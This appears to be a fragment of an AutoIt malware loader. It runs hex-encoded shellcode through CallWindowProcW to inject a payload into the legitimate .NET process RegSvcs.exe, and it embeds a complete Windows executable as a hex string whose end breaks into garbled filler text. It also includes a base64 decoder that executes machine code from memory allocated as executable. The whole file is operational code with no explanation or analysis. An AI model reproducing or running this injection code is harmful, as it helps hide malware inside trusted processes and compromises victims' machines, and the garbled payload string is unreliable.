			$ASM &= "8B09C701070001006A00E8E500000068D2C7A76851E8110100006A32E8D30000008B116A2EE8CA0000008B0952FF7104FFD06A22E8BB0000008B3983C7346A32E8AF0000008B318BB6A400000083C6086A2EE89D0000008B116A46E894000000516A045756FF326A00E88600000068A16A3DD851E8B200000083C40CFFD06A22E86F0000008B098B51280351346A32E8600000008B0981C1B000000089116A00E8"
			$ASM &= "4F00000068D3C7A7E851E87B0000006A32E83D0000008BD16A2EE8340000008B09FF32FF7104FFD06A00E82400000068883F4A9E51E8500000006A2EE8120000008B09FF7104FFD06A4AE8040000008B2161C38BCB034C2404C36A00E8F2FFFFFF6854CAAF9151E81E0000006A406800100000FF7424186A00FFD0FF742414E8CFFFFFFF890183C410C3E82200000068A44E0EEC50E84B00000083C408FF742404"
			$ASM &= "FFD0FF74240850E83800000083C408C355525153565733C0648B70308B760C8B761C8B6E088B7E208B3638471875F3803F6B7407803F4B7402EBE78BC55F5E5B595A5DC35552515356578B6C241C85ED74438B453C8B54287803D58B4A188B5A2003DDE330498B348B03F533FF33C0FCAC84C07407C1CF0D03F8EBF43B7C242075E18B5A2403DD668B0C4B8B5A1C03DD8B048B03C55F5E5B595A5DC3C300000000"
	if $Binary = "" Then Exit
	Local $BufferASM = DllStructCreate("byte[" & BinaryLen($ASM) & "]")
	Local $binBuffer=DllStructCreate("byte[" & BinaryLen($Binary) & "]")
	DllStructSetData($BufferASM, 1, $ASM)
	DllStructSetData($binBuffer, 1, $Binary)
	Local $Ret = DllCall("user32.dll", "int", "CallWindowProcW", "ptr", DllStructGetPtr($BufferASM), "wstr", "C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe", "ptr", DllStructGetPtr($binBuffer), "int", 0, "int", 0)
EndFunc
Func random23()
Global $sModule = "0x"
$sModule &= "4D5A80000100000004001000FFFF00004001000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F74206265"
$sModule &= "2072756E20696E20444F53206D6F64652E0D0A240000000000000000504500004C010400C3313E4F0000000000000000E0000F010B0101450032000000800000000000000010000000100000005000000000400000100000000200000100000000000000"
$sModule &= "0400000000000000008001000010000000000000020000000010000000100000000001000000000000000000100000000000000000000000000001004C0A0000001001005C69000000000000000000000000000000000000000000000000000000000000"
$sModule &= "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002E636F646500000070310000001000000032000000040000"
$sModule &= "000000000000000000000000200000602E6461746100000099AA000000500000000A000000360000000000000000000000000000400000C02E696461746100004C0A000000000100000C000000400000000000000000000000000000400000402E727372"
$sModule &= "630000005C69000000100100006A0000004C00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
$sModule &= "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
$sModule &= "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
$sModule &= "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
$sModule &= "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
$sModule &= "00000000000000000000000000000000000000000000000068D45040006A006A00FF157C014100FF15AC0141003DB70000000F849D010000FF159C014100683F5D400050FF150409410050833D3F5D4000010F844D0100008B1D3F5D40008D70044B8B3E"
$sModule &= "6843514000FF36FF153002410085C00F84CE000000688C514000FF36FF153002410085C00F84CF0000006888524000FF36FF153002410085C00F84D00000006896524000FF36FF153002410085C00F84C400000031FF6A0268A4524000FF36FF15B80941"
$sModule &= "0083C40C85C00F84B1000000476A0268AA524000FF36FF15B809410083C40C85C00F8496000000476A0268B0524000FF36FF15B809410083C40C85C0747F476A0268B6524000FF36FF15B809410083C40C85C07468568B36BF8D59400066ADAA84C075F9"
$sModule &= "5E688D594000FF15A801410085C0795F66C7058D5940000001EB5468595140006A006A00FF157C014100A3355D4000EB3E689E5140006A006A00FF157C014100A3395D4000EB28C6053D5D400001EB1FC6053E5D400001EB168B0683C00450FF15BC0941"
$sModule &= "0083C4048904BDBC52400083C6044B0F85BDFEFFFFFF15D8014100803D3D5D400001744E6A00FF15B00141006A0068021340006A006A6450FF15C405410050FF15900141006840000100684050400068E25040006A00FF150006410068F75040006A00FF"
$sModule &= "15D805410050FF1520064100EBCCB9BE504000803D8E594000010F84BC000000688D594000FF1534024100B9AB50400085C00F84A400000092E8D8050000B95850400083F8010F8490000000B97E50400083F8020F8482000000B92950400083F8037478"
$sModule &= "B90C50400083F804746E52FF15B80141006A0050FF15C8014100803D3E5D4000010F844FFFFFFF6A00FF15B0014100C7054B5D400028000000A3535D4000C705575D4000CE504000C7055B5D400040504000C7055F5D400080000100C705635D40000100"
$sModule &= "0000684B5D4000FF150406410031C0E9FEFEFFFF803D3E5D4000010F84F1FEFFFF68400001006840504000516A00FF1500064100B801000000E9D4FEFFFF6A64FF15000241006A006AFF6833020000FF35435D4000FF150C064100C204005589E5817D0C"
$sModule &= "10010000744C837D0C240F8484010000817D0C120100000F848D010000817D0C110100000F8468020000837D0C050F8482020000817D0C330200000F849F020000837D0C100F840403000031C0E90D0300008B4508A3435D40006A00FF7508FF15EC0541"
$sModule &= "0089C36A006A00680008000053FF15B005410068145140006A006A0153FF15B005410031C0833D355D4000000F94C04883E00883C80068295140006A6F5053FF15B00541006A006A00680008000053FF15B005410031C0833D395D4000000F94C04883E0"
$sModule &= "0883C80068715140006A705053FF15B005410068BA5140006A716A2053FF15B00541006A006A00680008000053FF15B005410068EA5140006A726A0053FF15B00541006A00FF15B00141006A006A106A106A016A0250FF15FC054100506A006880000000"
$sModule &= "FF7508FF151806410068005040006A306A006A006A006A006A006A006A0068900100006A006A006A006AF5FF15440841006A00506A306A68FF7508FF1514064100803D8D594000000F84E00100006A006A006A0068E21240006A006A00FF1588014100E9"
$sModule &= "C60100008B4514C7401818010000C7401CC9000000E9B001000031C0837D106F7417837D10707425837D10717433837D1072744EE996010000535657BB6F000000BE59514000BF355D4000EB56535657BB70000000BE9E514000BF395D4000EB426A00FF"
$sModule &= "15B0014100FF7508689F1B4000FF75086A6550FF15C4054100E9480100006A00FF15B0014100FF750868AF1D4000FF75086A6750FF15C4054100E9270100006A00FF7508FF15EC054100506A005350FF15E805410083F0085950505351FF15BC05410058"
$sModule &= "85F6742BA908000000740F566A006A00FF157C0141008907EB188B1F53FF15EC01410053FF1578014100832700EB038037015F5E5BE9C8000000817D10680000010F85BB0000006A68FF7508FF15E405410050FF15F0054100E9A40000006A68FF7508FF"
$sModule &= "15E40541000FB755160FB74D1483EA0583E9066A0152516A056A0650FF1508064100EB7AFF7508FF1520064100837D10FF74226800010000688D5940006A00FF7510FF150C09410050FF7510FF15080941005AEB0C688D594000FF1534024100926A006A"
$sModule &= "0052686B1640006A006A00FF15880141006A00FF15B0014100FF750868331D4000FF75086A6650FF15C4054100EB0B6A00FF7508FF15CC054100B801000000C9C210005589E58B5508E87C01000051B95850400083F8010F8440010000B97E50400083F8"
$sModule &= "020F8432010000B92950400083F8030F84B6000000B90C50400083F8040F84A800000089D6526A68FF35435D4000FF151C0641006A00FF15B00141006A006A106A106A016A0150FF15FC054100506A006880000000FF35435D4000FF15180641005985C9"
$sModule &= "0F849F00000068A857400056E8461F000083C40829F00F88890000008D4809515068B10000006A68FF35435D4000FF15140641006A006A0068B70000006A68FF35435D4000FF151406410068CC5240006A0068031500006A68FF35435D4000FF15140641"
$sModule &= "00EB3E890C246A00FF15B00141006A006A106A106A016A0250FF15FC054100506A006880000000FF35435D4000FF15180641006A68FF35435D4000FF151C064100FF15B8014100566A0050FF15C8014100833D355D400000742E6A006A6F6812010000FF"
$sModule &= "35435D4000FF1518064100EB176840000100684050400051FF35435D4000FF15000641006A006A006A10FF35475D4000FF1518064100C9C20400535657FD89D1B05C8DBA8C594000F2AEFCE313C6470100688D594000FF15F4014100C647015C83EC0454"
$sModule &= "688D594000FF15980141008B042483C40431FF83F80074104783F806740AB901000000E956030000C705AD5C40004400000031C0688D5C400068AD5C400050506A04505050688D59400050FF1580014100B90200000085C00F8420030000688D5A400068"
$sModule &= "00010000FF15C0014100688D5A40006A006A00688D5A4000FF15BC0141006A00688D5A4000FF151C024100508D470483EC04546A0350E8FF0500008B0C2483C4048B1424515052FF152C024100FF151802410085FF751D688D5A4000FF35955C4000E816"
$sModule &= "06000085C00F847E020000E956010000688D5B40006800010000FF15C0014100688D5B40006A006A00688D5B4000FF15BC0141006A00688D5B4000FF151C0241005083EC04546A036A06E8870500008B0C2483C4048B1424515052FF152C024100FF1518"
$sModule &= "024100688D5A4000FF15AC09410083C404FD8DB08C5A40008D7E025791F3A45FFC4766C7058D5A4000202266C707222083C7026A0A57FF35955C4000FF158C09410083C40C688D5A4000688D5B4000FF159809410083C408C705F15C40004400000031C0"
$sModule &= "689D5C400068F15C4000505050505050688D5B400050FF15800141006AFFFF359D5C4000FF151002410083EC0454FF359D5C4000FF15A00141008B1C2483C404BF8F5A4000B02283C9FFF2AEC647FF00688F5A4000688D5A4000FF15A409410083C408BF"
$sModule &= "8D5B4000B02283C9FFF2AEC647FE00688D5B4000FF158C014100FF359D5C4000FF1578014100FF35A15C4000FF157801410085DB0F8423010000FF35915C4000FF15F00141006AFFFF358D5C4000FF1510024100688D5A4000FF158C014100FF358D5C40"
$sModule &= "00FF1578014100FF35915C4000FF1578014100688D594000FF153402410092FD83C9FFB05C8DBA8C59400089FEF2AEF7D9B02E83E90289F7F2AEFC8D47010F45C6C7005F2E617566C7400433006A02688D594000FF1524024100B90400000085C00F88BF"
$sModule &= "00000089C66A026A0056FF15200241008D5801FF15B8014100536A0050FF15C401410089C74BC6041F006A006A0056FF1520024100535756FF1528024100FF35C8524000FF35C4524000FF35C0524000FF35BC5240005357E82B0500005139DA741D5052"
$sModule &= "506A006A0056FF152002410056FF152C02410056FF15F8014100589356FF151802410057FF15D80141005889DA31C9EB2D6A00FF358D5C4000FF1504024100FF358D5C4000FF1578014100FF35915C4000FF1578014100B90300000031D2915F5E5BC355"
$sModule &= "89E583EC10817D0C10010000741E817D0C110100000F8412010000837D0C100F845A01000031C0E9630100008D45F050FF7514FF15DC0541008D45F050FF7514FF15C0054100FF4DF0FF4DF48345FC028345F8026A00FF75FCFF75F8FF75F4FF75F06A00"
$sModule &= "FF7508FF15280641008D45F050FF7514FF15DC0541006A69FF7508FF15E40541008B4DFC8B55F883E92483EA2E6A016A006A0051526A0050FF1528064100538B5D08FF35BC5240006A6A53FF15B8054100FF35C45240006A6C53FF15B8054100FF35C852"
$sModule &= "40006A6D53FF15B80541006A6B53FF15E40541009368CF5140006A00684301000053FF151806410068DD5140006A00684301000053FF151806410068E45140006A00684301000053FF15180641006A00FF35C0524000684E01000053FF15180641005BEB"
$sModule &= "5D837D10027406837D10697551538B5D086A6A53FF15F8054100A3BC5240006A6C53FF15F8054100A3C45240006A6D53FF15F8054100A3C85240006A006A0068470100006A6B53FF1514064100A3C05240005B6A00FF7508FF15CC054100B801000000C9"
$sModule &= "C210005589E5817D0C100100007413817D0C120100007446837D0C10744D31C0EB598B4508A3475D4000FF7508FF7514E87C0200006A016A006A0052506A00FF7508FF15280641006A006A01680A0400006A6EFF7508FF1514064100EB1831C0817D1060"
$sModule &= "F00000740DEB106A00FF7508FF15CC054100B801000000C9C210005589E583EC40817D0C10010000744B817D0C13010000747E837D0C0F0F8491000000817D0C010200000F84A5000000817D0C040200000F84B2000000817D0C110100000F849F000000"
$sModule &= "837D0C100F849B00000031C0E9AD000000FF7508FF7514E8CD0100006A016A006A0052506A00FF7508FF1528064100E800020000FF7508E8D11000006A006A1E6A00FF7508FF1524064100EB6C803D8CFA4000017458E8311200006A006A00FF7508FF15"
$sModule &= "F4054100EB4F578D7DC057FF7508FF15B405410050E8DF11000057FF7508FF15D00541005FEB336A006A0268A1000000FF7508FF1518064100EB1A837D10027514C6058BFA400001EB0B6A00FF7508FF15CC054100B801000000C9C210005589E557FF75"
$sModule &= "0CFF75086A00FF159401410085C0742889C7506A00FF15FC0141008B4D1085C974028901576A00FF15D001410085C0740750FF15E40141005FC9C20C005589E5535657FF75086A0068FF0F1F00FF15E801410085C00F84BD00000089C7FF750CFF153402"
$sModule &= "41008D70016A406800300000566A0057FF150802410085C00F848F00000089C36A0056FF750C5357FF1514024100E8090000006B65726E656C333200FF15B0014100E80D0000004C6F61644C696272617279410050FF15B401410031C951515350515157"
$sModule &= "FF158401410031F685C0742389C66AFF56FF151002410083EC045456FF15A401410056FF15780141008B342483C40468008000006A005357FF150C02410057FF157801410089F0EB0957FF157801410031C05F5E5BC9C208005589E583EC108D45F050FF"
$sModule &= "7508FF15DC054100D16DF8D16DFC8D45F850FF7508FF15C0054100FF75F8FF75FC8D45F050FF750CFF15DC054100D16DF8D16DFC5A582B55FC2B45F8C9C2080031C00FA20F31A3735D4000C36905735D40000584080840A3735D4000C3916905735D4000"
$sModule &= "0584080840A3735D400031D2F7F192C35589E5568B45088B4D0CA37B5D4000890D7F5D4000968A4D108A6D148A55188A751C880D835D4000882D845D40008815855D40008835865D4000E81B0D0000E843000000E8730500008B35775D4000E87C0C0000"
$sModule &= "E8B70C000056FF15AC09410083C40489C2B90D0A0D0A8D4416FC3908750830C983EA02884802960FB60D885D40005EC9C21800803D835D400000741B833DA15D4000007412E82A00000085C07409C605875D400001EB1CC605875D400000FF357B5D4000"
$sModule &= "FF35775D4000FF15A409410083C408C35356578B357B5D4000E8AC0B000085C00F845D030000E85B0B000083F8010F864F030000E8EC0A0000E882110000A38D5D4000E878110000A3915D40006A0150E86B130000E866110000A3895D400056E8030600"
$sModule &= "00683C55400056E8A4170000508B3857E88914000050E8250A000096685E5640005768F5E14000E88718000089C785C90F84A30000006A0068F5E1400056E8D914000068A556400068F5E1400068F5E14000E85C18000068F856400068F5E14000E84A17"
$sModule &= "00005089C3538B1B85DB745B68FB5640005368AD5D4000E83318000068035740005368CD5D4000E82318000052FF158809410083C40450E88F090000505068AD5D4000E8F213000050FF35895D4000E8DB12000068AD5D400056E86202000089C65B83C3"
$sModule &= "04EB9E83C404FF15D8014100E943FFFFFF6A0056FF358D5D4000E8AC1200008B04248D7004568B3685F60F8441010000684A55400056686D5E4000E8AB170000E86E09000085C00F841B0100006A00686D5E4000FF35915D4000E86C12000056E8711300"
$sModule &= "0089C668BB5540005668F5614000E87417000085C90F848900000089D76A005256E8CA13000068B95640005768F5E14000E85117000089C785C9746868F856400068F5E14000E8391600005089C3538B1B85DB744468FB5640005368AD5D4000E8221700"
$sModule &= "0068035740005368CD5D4000E81217000052FF158809410083C40450E87E0800005068AD5D400056E86801000089C65B83C304EBB583C404FF15D8014100EB82803D845D400002740E56E8D507000050E86006000089C656FF15AC09410083C404817C06"
$sModule &= "F5456E64467427FF35895D4000E8BA1000008D58FF53FF35895D4000E8FC110000525056E80801000089C64B79E76A0056FF358D5D4000E8631100005E83C604E9B4FEFFFF83C404FF15D8014100FF358D5D4000E873100000A3955D40008B3D775D4000"
$sModule &= "31DB53FF358D5D4000E8C81100005089C68A068807464784C075F6FF15D80141004F683C55400057FF15A409410083C4084383C7053B1D955D400075C5C647FB00FF358D5D4000E8EE0E0000803D845D400002741CFF0D955D4000FF35775D4000E8DD03"
$sModule &= "000050E855040000A3775D4000FF35915D4000E8BE0E0000E8AB030000FF35895D4000E8DC0F000085C074198D58FF53FF35895D4000E83711000050FF15D80141004B79EAFF35895D4000E8860E0000FF35A15D4000FF15D8014100B801000000EB0231"
$sModule &= "C05F5E5BC35589E55356578B5D108B750CBF32574000E88600000066C747FF2900682B574000FF7508FF15B409410083C40885C0753F8B750CBF16574000E85E00000066C747FF2900680E574000FF7508FF15B409410083C40885C0744E8178FB536865"
$sModule &= "6C7445C7450C0E574000BA4C574000EB0CC7450C2B574000BA67574000803B200F85A3000000BEF5E14000525356E8FC14000085C90F45DEE98C0000008A068807464784C075F6C355BDF6E1400089DE89EFE8E6FFFFFF6A2253FF159C09410083C408BA"
$sModule &= "2200000085C0743E6A2753FF159C09410083C408BA2700000085C07429C645FF226847574000684A57400055E80311000030C083C9FFF2AE66C747FF2200BBF5E140005DEB0CBBF5E14000668957FF88135D53FF750CFF7508E8D61000005F5E5BC9C20C"
$sModule &= "0053FF158809410083C40483F8F17C0783F80F7F27EBD7A9FFFFFF7F741EF7D8BBF5E140008D4B036A085051E8C508000066C7032D30C6430278EBB2BBF5E140008D4B026A085051E8A908000066C7033078EB9A803D845D4000000F8456010000803D84"
$sModule &= "5D4000020F8449010000803D875D4000010F843C0100005356578B35775D4000E8870C0000A38D5D4000E87D0C0000A3915D40006A0150E8700E000056E812010000683C55400056E8B3120000508B3857E8980F00006A0050FF358D5D4000E87F0E0000"
$sModule &= "8B04248D7004568B3685F67448684A55400056686D5E4000E8821300006A00686D5E4000FF35915D4000E8500E000056E8550F000050E86504000050E8F00200006A0050FF358D5D4000E8300E00005E83C604EBB183C404FF15D8014100FF358D5D4000"
$sModule &= "E8430D0000A3955D40008B3D775D400031DB53FF358D5D4000E8980E00005089C68A068807464784C075F6FF15D80141004F683C55400057FF15A409410083C4084383C7053B1D955D400075C5C647FB00FF358D5D4000E8BE0B0000FF0D955D4000FF35"
$sModule &= "775D4000E8B600000050E82E010000A3775D4000FF35915D4000E8970B0000E8840000005F5E5BC35589E583EC0456E84C0B0000A3995D40006A0150E83F0D0000E83A0B0000A39D5D40006A0150E82D0D000068E3554000FF750868F5614000E8721200"
$sModule &= "0085C9743A8D45FC66C7002C005068F5614000E8581100005089C6568B3685F674146A0056FF359D5D4000E8230D00005E83C604EBE583C404FF15D80141005EC9C20400FF35995D4000E8030B0000FF359D5D4000E8F80A0000C35589E55356578B7508"
$sModule &= "31DB8D43016A04506826564000E84506000053FF35915D4000E86C0D00004389C7680956400057FF15A809410083C40885C07431681756400057FF15A809410083C40885C0741E57FF359D5D4000E84F0D000085C0790E68245640005756E8610F000089"
$sModule &= "C63B1D955D40007595965F5E5BC9C204005589E583EC045356578B7508C745FC00000000BF010000008B45FC01F068595540005068F5E14000E86D11000085C90F84EE00000029F029C88945FC8D42018D5A016A2850FF159C09410083C40885C0743280"
$sModule &= "780129742C5040B9010000008A1080FA28740880FA29740740EBF14041EBED404975E95A5052FF15A409410083C408EBBE6A5B53FF159C09410083C40885C074328078015D742C5040B9010000008A1080FA5B740880FA5D740740EBF14041EBED404975"
$sModule &= "E95A5052FF15A409410083C408EBBE68A955400053E8C60F00005089C3538B1B85DB743A68AF5540005368AD5D4000E8AF100000813A6C6F6356741C683F56400052566A04576842564000E8DB040000E8430E000089C6475B83C304EBBF83C404FF15D8"
$sModule &= "014100E9F5FEFFFF89F05F5E5BC9C204005589E583EC045356578B7508C745FC00000000BF01000000684255400056FF15B409410083C4085068F5614000FF15A409410083C40458C600008B45FC01F068595540005068F5E14000E81F10000085C90F84"
$sModule &= "F300000029F029C88945FC803A4774D78D42018D5A016A2850FF159C09410083C40885C0743280780129742C5040B9010000008A1080FA28740880FA29740740EBF14041EBED404975E95A5052FF15A409410083C408EBBE6A5B53FF159C09410083C408"
$sModule &= "85C074328078015D742C5040B9010000008A1080FA5B740880FA5D740740EBF14041EBED404975E95A5052FF15A409410083C408EBBE68A955400053E8730E00005089C3538B1B85DB743A68AF5540005368AD5D4000E85C0F0000813A6C6F6356741C68"
$sModule &= "4D56400052566A04576853564000E888030000E8F00C000089C6475B83C304EBBF83C404FF15D8014100E9F0FEFFFF56FF15AC09410083C4048D040668F561400050FF159809410083C40889F05F5E5BC9C204005589E55356578B750868505540005668"
$sModule &= "F5614000E8E60E000085C97455BF0100000068A655400052E8CF0D00005089C3538B1B85DB74326A02576834564000E8030300004768AD5540005368F5614000E8AA0E000068315640005256E8070B000089C65B83C304EBC783C404FF15D801410089F0"
$sModule &= "5F5E5BC9C204008B4424048B15A15D40008B4482FCC20400568B74240868165440005668F5614000E85E0E000085C97514688E5440005668F5614000E84A0E000085C974096A005256E8A60A0000965EC2040056BE6D5E400068DD5D400056FF15A00941"
$sModule &= "0083C40885C0742B680D5E400056FF15A009410083C40885C07418683D5E400056FF15A009410083C40885C07405B8010000005EC3568B357B5D400068DC5240005668DD5D4000E8DB0D000085C9751068185340005668DD5D4000E8C70D0000683A5340"
$sModule &= "0056680D5E4000E8B70D000085C97510689F53400056680D5E4000E8A30D000068EC53400056683D5E4000E8930D00005EC356689D5F4000FF35A15D4000E87D0C000089C68915A55D4000FF35A15D4000FF15D80141008935A15D40008B0685C0740C50"
$sModule &= "50E80D0D000083C604EBEEA1A55D40005EC3A1A95D4000680A55400050689D5F4000E8380D000085C97411689D5F400068F5614000E8D90C0000EBDB803DF5614000007418682F55400068F5614000689D5F4000E8060D000085C9750231C0C356803D85"
$sModule &= "5D40000175348B35775D400068835740005668F5614000E8DF0C000085C9741A89C6807A013A75E429C88D48035150FF15A409410083C408EBD25EC35589E583EC0468A8574000FF35775D4000E8C108000083C40885C07424803D865D400001751B8D45"
$sModule &= "FC66C70031005068A8574000FF35775D4000E8350A000031C00F9505885D4000C9C3803D835D4000007411E82B00000089C1030D7F5D400085C075108B157F5D40008B0D7F5D4000D1EA01D1516A00FF15D4014100A3775D4000C3535768C8544000FF35"
$sModule &= "7B5D4000689D5E4000E8250C000085C97464A3A95D40006A00689D5E4000FF152402410085C0784E89C76A026A0057FF152002410089C36A006A0057FF15200241008D4301506A00FF15D4014100C6041800A3A15D4000535057FF152802410057FF1518"
$sModule &= "024100689D5E4000FF158C01410089D8EB0231C05F5BC35589E553578B5D108B7D086A0A57FF750CFF158C09410057FF15AC09410083C41039D8731C29C38D141F40505752FF1590094100536A3057FF159409410083C4185F5BC9C20C005589E553578B"
$sModule &= "5D108B7D086A1057FF750CFF158C09410057FF15AC09410083C41039D8731C29C38D141F40505752FF1590094100536A3057FF159409410083C4185F5BC9C20C005589E557FF7508FF15E005410089C750FF1540084100A35FFA4000686BFA4000FF7508"
$sModule &= "FF15DC0541008B1577FA40008B0D73FA4000891567FA4000890D63FA40005251D1EAD1E94A4989157FFA4000890D7BFA400057FF153C08410050FF355FFA4000FF154C08410057FF15100641006A01FF355FFA4000FF155008410068B25740006A316A00"
$sModule &= "6A006A0068FF0000006A006A006A006A006A006A006A056AF4FF154408410050FF355FFA4000FF154C0841006A04FF1548084100A383FA4000C70587FA4000C8000000C6058BFA400000C6058CFA400000C7058DFA40000000000068B4000000D9EBDA34"
$sModule &= "24DD1D91FA400083C404E8050000005FC9C204005357BBFA000000BFADED4000B868010000E82FF0FFFF408907F7C303000000740FB820000000E81AF0FFFF894704EB0BC7470432000000C6470C01B808000000E800F0FFFF89470883C70D4B75BE5F5B"
$sModule &= "C35589E5682000CC006A006A00FF355FFA4000FF3567FA4000FF3563FA40006A006A00FF7508FF1538084100C9C20400FF3583FA4000686BFA4000FF355FFA4000FF15D40541005357BBFA000000BFADED4000803D8BFA4000010F84E5000000807F0C01"
$sModule &= "746F8B4708D1E84001075331DB8B0729D8FF770450E8D201000003157FFA400003057BFA400050B9FFFFFF00B8303030000FAFC329C158515250FF355FFA4000FF15540841004383FB0572C15B813F680100000F82E6000000C70701000000B808000000"
$sModule &= "E828EFFFFF894708E9CE0000008B4708C1E8024029075331DB8B078B4F0401D80FB690E957400001D15150E858476847934572582564625727625ZGBSDHSADFBNDZFNDZNZDFTDRJZSDRJZETYT37583456825836928468969236983659579356953709356"

EndFunc



Func _B64Decode($sSource)

    Local Static $Opcode, $tMem, $tRevIndex, $fStartup = True

    If $fStartup Then
        If @AutoItX64 Then
            $Opcode = '0xC800000053574D89C74C89C74889D64889CB4C89C89948C7C10400000048F7F148C7C10300000048F7E14989C242807C0EFF3D750E49FFCA42807C0EFE3D750349FFCA4C89C89948C7C10800000048F7F14889C148FFC1488B064989CD48C7C108000000D7C0C0024188C349C1E30648C1E808E2EF49C1E308490FCB4C891F4883C7064883C6084C89E9E2CB4C89D05F5BC9C3'
        Else
            $Opcode = '0xC8080000FF75108B7D108B5D088B750C8B4D148B06D7C0C00288C2C1E808C1E206D7C0C00288C2C1E808C1E206D7C0C00288C2C1E808C1E206D7C0C00288C2C1E808C1E2060FCA891783C70383C604E2C2807EFF3D75084F807EFE3D75014FC6070089F85B29D8C9C21000'
        EndIf

        Local $aMemBuff = DllCall("kernel32.dll", "ptr", "VirtualAlloc", "ptr", 0, "ulong_ptr", BinaryLen($Opcode), "dword", 4096, "dword", 64)
        $tMem = DllStructCreate('byte[' & BinaryLen($Opcode) & ']', $aMemBuff[0])
        DllStructSetData($tMem, 1, $Opcode)

        Local $aRevIndex[128]
        Local $aTable = StringToASCIIArray('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/')
        For $i = 0 To UBound($aTable) - 1
            $aRevIndex[$aTable[$i]] = $i
        Next
        $tRevIndex = DllStructCreate('byte[' & 128 & ']')
        DllStructSetData($tRevIndex, 1, StringToBinary(StringFromASCIIArray($aRevIndex)))

        $fStartup = False
    EndIf

    Local $iLen = StringLen($sSource)
    Local $tOutput = DllStructCreate('byte[' & $iLen + 8 & ']')
    DllCall("kernel32.dll", "bool", "VirtualProtect", "struct*", $tOutput, "dword_ptr", DllStructGetSize($tOutput), "dword", 0x00000004, "dword*", 0)

    Local $tSource = DllStructCreate('char[' & $iLen + 8 & ']')
    DllStructSetData($tSource, 1, $sSource)

    Local $aRet = DllCallAddress('uint', DllStructGetPtr($tMem), 'struct*', $tRevIndex, 'struct*', $tSource, 'struct*', $tOutput, 'uint', (@AutoItX64 ? $iLen : $iLen / 4))

    Return BinaryMid(DllStructGetData($tOutput, 1), 1, $aRet[0])

EndFunc





